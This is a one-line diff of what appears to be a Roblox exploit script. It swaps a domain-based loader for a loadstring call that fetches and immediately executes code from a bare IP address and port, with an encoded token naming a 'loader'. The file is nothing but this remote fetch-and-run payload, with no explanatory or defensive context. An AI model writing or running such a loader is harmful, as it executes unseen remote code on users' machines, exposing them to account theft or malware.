@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://api.overdrivehub.xyz/v1/auth"))()
+loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6IjgzYWUwZGNjLTFhZjMtNGM5ZC1hZjk2LTE5YTUzYzg1OTc3NyIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJjdXN0b20iLCJ1cmwiOiJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vMHZlcmRyaXZlSC9PL3JlZnMvaGVhZHMvbWFpbi9vdmVyZHJpdmUlMjBILnR4dCJ9fQ"))()
